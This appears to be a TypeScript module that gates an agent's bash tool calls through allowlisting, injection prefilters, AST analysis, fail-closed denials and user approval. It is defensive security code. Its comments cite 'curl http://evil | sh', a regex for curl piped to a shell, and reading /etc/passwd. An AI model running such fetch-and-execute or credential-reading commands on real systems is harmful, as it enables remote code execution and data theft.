/**
 * @koi/bash-ast — tool-facing classifier with interactive elicit support.
 *
 * Two entry points:
 *
 *   - `classifyBashCommand(command, opts)` — **sync**. The legacy path for
 *     callers without an interactive surface (standalone tool tests, CI
 *     gates, etc.). Uses the transitional regex TTP fallback for `too-
 *     complex` commands; will be deleted once #1622's full persistence
 *     story ships.
 *
 *   - `classifyBashCommandWithElicit(command, opts)` — **async**. The
 *     production path wired from `@koi/runtime`. When the AST walker
 *     returns `too-complex` for a command whose nodeType is NOT a shell-
 *     escape hard-deny reason, calls the provided `elicit` callback to
 *     ask the user for explicit approval. Closes the full fail-closed
 *     loop for #1634: the regex fallback is bypassed when a real ask-
 *     user surface is available.
 *
 * Shared pipeline:
 *
 *   1. Allowlist gate           — policy.allowlist match + compound-op reject
 *   2. Pre-parse prefilter      — byte-level fast-reject (null bytes,
 *                                 encoded traversal, hex-escaped strings)
 *   3. cwd validation           — workspace containment via realpath
 *   4. AST analysis             — extract SimpleCommand[] or get too-complex
 *   5a. simple                  — defense-in-depth via regex TTP classifier
 *   5b. too-complex hard-deny   — shell escape nodeTypes → fail closed
 *   5c. too-complex askable     — elicit (async path) OR regex fallback (sync)
 *   5d. parse-unavailable       — fail closed, never falls through
 */

import {
  type BashPolicy,
  type ClassificationResult,
  detectInjection,
  classifyCommand as regexClassifyTtp,
  validatePath,
} from "@koi/bash-security";
import { analyzeBashCommand } from "./analyze.js";
import type { AstAnalysis } from "./types.js";

/** Options accepted by `classifyBashCommand`. Mirrors @koi/bash-security's
 * signature so existing call sites do not need to reshape opts. */
export interface ClassifyOptions {
  readonly cwd?: string;
  readonly policy?: BashPolicy;
  readonly workspaceRoot?: string;
}

/**
 * Interactive elicit callback — returns `true` to allow the command to
 * proceed, `false` to block it. Implementations surface the command text
 * and walker reason to the user via a channel-level prompt (TUI dialog,
 * CLI readline, etc.).
 *
 * Called ONLY for `too-complex` outcomes whose `nodeType` is not a shell-
 * escape hard-deny reason. Hard-denies and `parse-unavailable` never reach
 * the elicit callback.
 */
export type ElicitCallback = (params: {
  readonly command: string;
  readonly reason: string;
  readonly nodeType?: string;
  readonly signal?: AbortSignal;
}) => Promise<boolean>;

/** Options for the async classify path. Extends sync options with elicit. */
export interface ClassifyOptionsWithElicit extends ClassifyOptions {
  readonly elicit: ElicitCallback;
  readonly signal?: AbortSignal;
}

/**
 * NodeTypes that indicate shell-escape ambiguity — the raw source text
 * does not match bash's effective semantics, so neither the AST walker
 * nor the raw-text regex classifier can safely analyse the command.
 * These always hard-deny, regardless of whether an elicit callback is
 * provided. Asking the user about `cat \/etc\/passwd` is not safe because
 * the user probably can't tell the displayed form apart from the benign
 * `cat /etc/passwd`.
 */
const HARD_DENY_NODE_TYPES: ReadonlySet<string> = new Set([
  "word",
  "string_content",
  "prefilter:line-continuation",
]);

/**
 * Shared prefilter pipeline — allowlist gate, byte-level injection reject,
 * cwd validation. Returns a blocked `ClassificationResult` on failure, or
 * `null` to proceed to AST analysis. Used by both the sync and async
 * classify entry points.
 */
function runPrefilter(command: string, opts?: ClassifyOptions): ClassificationResult | null {
  const { cwd, policy, workspaceRoot } = opts ?? {};

  // 1a. Allowlist gate — preserved from @koi/bash-security's classify.ts
  // so policy.allowlist continues to work unchanged.
  if (policy?.allowlist !== undefined && policy.allowlist.length > 0) {
    const allowlisted = policy.allowlist.some((prefix: string) => command.startsWith(prefix));
    if (!allowlisted) {
      return {
        ok: false,
        reason: "Command does not match any configured allowlist prefix",
        pattern: policy.allowlist.join(" | "),
        category: "injection",
      };
    }
    // Compound operators let an attacker chain arbitrary follow-on commands
    // after an allowlisted prefix. Reject them when an allowlist is active.
    const compoundMatch = /[;|&`\n]|\$\(/.exec(command);
    if (compoundMatch !== null) {
      return {
        ok: false,
        reason:
          "Compound command operators are disallowed when an allowlist is active — use a single simple command",
        pattern: compoundMatch[0] ?? "",
        category: "injection",
      };
    }
  }

  // 1b. Pre-parse prefilter — byte-level fast-reject
  const injection = detectInjection(command);
  if (!injection.ok) return injection;

  if (cwd !== undefined) {
    const pathResult = validatePath(cwd, workspaceRoot);
    if (!pathResult.ok) return pathResult;
  }

  return null;
}

/**
 * Shared post-analysis disposition — handles the `simple`, hard-deny
 * `too-complex`, and `parse-unavailable` branches. For `too-complex`
 * cases whose nodeType is NOT in `HARD_DENY_NODE_TYPES`, returns `null`
 * so the caller (sync or async) can apply its own fallback: the sync
 * caller falls through to the regex TTP classifier; the async caller
 * invokes the elicit callback.
 */
function dispose(command: string, analysis: AstAnalysis): ClassificationResult | null {
  switch (analysis.kind) {
    case "simple": {
      // AST produced trustworthy argv for every command. Still run the
      // regex TTP classifier as a defense-in-depth gate — a command with a
      // clean static argv can still be e.g. `curl http://evil | sh` where
      // the pipe segment is a separate SimpleCommand (`sh`) but the regex
      // classifier has extra signal (remote-fetch-pipe-shell pattern).
      return regexClassifyTtp(command);
    }
    case "too-complex": {
      // SECURITY: certain `too-complex` reasons indicate bash source whose
      // raw text does NOT match bash's effective semantics — backslash
      // escapes in unquoted words, inside double-quoted strings, or as
      // line continuations. For these, the raw-text regex classifier AND
      // an interactive user prompt are both unsafe: the displayed command
      // doesn't match the effective argv, so a user can't meaningfully
      // approve `cat \/etc\/passwd` vs `cat /etc/passwd`. Hard-deny.
      if (analysis.nodeType !== undefined && HARD_DENY_NODE_TYPES.has(analysis.nodeType)) {
        return {
          ok: false,
          reason: `Bash source uses shell escape sequences that cannot be safely analysed: ${analysis.reason}`,
          pattern: analysis.nodeType,
          category: "injection",
        };
      }
      // Caller decides: sync → regex fallback, async → elicit.
      return null;
    }
    case "parse-unavailable": {
      // Fail closed. The parser could not run. DO NOT fall through to a
      // permissive path — that would violate the fail-closed invariant.
      return {
        ok: false,
        reason: `Bash AST parser unavailable: ${analysis.cause}`,
        pattern: `parse-unavailable:${analysis.cause}`,
        category: "injection",
      };
    }
  }
}

/**
 * Sync classification pipeline (transitional / standalone callers).
 *
 * Returns `{ ok: true }` only if ALL of the following hold:
 *   - The command passes the byte-level prefilter.
 *   - If `cwd` is provided, it resolves inside `workspaceRoot`.
 *   - Either the AST walker produced a `simple` result (AST path) OR the
 *     regex classifier found no known-dangerous TTP pattern (fallback path
 *     for `too-complex` commands). Both checks independently enforce the
 *     denylist.
 *   - The parser was available (not `parse-unavailable`).
 *
 * Sync hot path. Requires `initializeBashAst()` to have resolved before the
 * first call; otherwise returns a fail-closed error.
 *
 * For interactive callers with an elicit surface (TUI, CLI with prompt
 * support), use `classifyBashCommandWithElicit` instead — that function
 * bypasses the regex fallback for `too-complex` commands and asks the
 * user for explicit approval.
 */
export function classifyBashCommand(command: string, opts?: ClassifyOptions): ClassificationResult {
  const prefilter = runPrefilter(command, opts);
  if (prefilter !== null) return prefilter;

  const analysis = analyzeBashCommand(command);
  const disposed = dispose(command, analysis);
  if (disposed !== null) return disposed;

  // Fall-through: analysis was `too-complex` with a non-hard-deny nodeType.
  // Run the transitional regex TTP classifier as a compatibility shim.
  // TODO(#1622 follow-up): callers with an elicit surface should use
  // `classifyBashCommandWithElicit` instead of this sync path.
  return regexClassifyTtp(command);
}

/**
 * Async classification pipeline with interactive elicit fallback.
 *
 * Same pipeline as `classifyBashCommand`, but replaces the transitional
 * regex fallback for `too-complex` commands with an interactive prompt
 * via the provided `elicit` callback. Closes the full fail-closed loop
 * for #1634: instead of silently passing `$VAR` / `$(...)` / control-
 * flow commands through a string-match regex classifier, the user sees
 * a prompt and explicitly allows or denies each one.
 *
 * Outcomes:
 *   - Prefilter blocked       → `{ ok: false }` with prefilter reason
 *   - AST simple              → regex TTP defense-in-depth → its result
 *   - AST too-complex (hard)  → `{ ok: false }` with `nodeType` pattern
 *   - AST too-complex (ask)   → `elicit(...)` → allow/deny per user
 *   - AST parse-unavailable   → `{ ok: false }` fail closed
 *
 * Requires `initializeBashAst()` to have resolved. The caller MUST
 * provide `elicit`; there is no silent fallback in this path.
 */
export async function classifyBashCommandWithElicit(
  command: string,
  opts: ClassifyOptionsWithElicit,
): Promise<ClassificationResult> {
  const prefilter = runPrefilter(command, opts);
  if (prefilter !== null) return prefilter;

  const analysis = analyzeBashCommand(command);
  const disposed = dispose(command, analysis);
  if (disposed !== null) return disposed;

  // too-complex with a non-hard-deny nodeType. Ask the user.
  if (analysis.kind !== "too-complex") {
    // Defensive: `dispose` only returns null on too-complex non-hard-deny.
    // Any other case indicates a dispose() bug — fail closed.
    return {
      ok: false,
      reason: "classifier internal error: unexpected null dispose result",
      pattern: "internal",
      category: "injection",
    };
  }

  let approved: boolean;
  try {
    approved = await opts.elicit({
      command,
      reason: analysis.reason,
      ...(analysis.nodeType !== undefined ? { nodeType: analysis.nodeType } : {}),
      ...(opts.signal !== undefined ? { signal: opts.signal } : {}),
    });
  } catch (err) {
    // Elicit rejection (user abort, channel error, timeout, etc.) → deny.
    // We do NOT fall through to the regex classifier here because doing so
    // would reintroduce the security hole the elicit path was meant to
    // close (users must explicitly consent to untrusted shell grammar).
    return {
      ok: false,
      reason: `Interactive approval failed: ${err instanceof Error ? err.message : String(err)}`,
      pattern: "elicit-error",
      category: "injection",
    };
  }

  if (!approved) {
    return {
      ok: false,
      reason: `User denied command after too-complex AST analysis: ${analysis.reason}`,
      pattern: analysis.nodeType ?? "too-complex",
      category: "injection",
    };
  }

  // User approved. Still run the regex TTP classifier as defense-in-depth
  // to catch known-malicious patterns the user may not have recognised —
  // e.g., an attacker who smuggles `curl | bash` past a distracted user
  // still gets blocked by the `curl.*\|\s*(ba)?sh` pattern.
  return regexClassifyTtp(command);
}
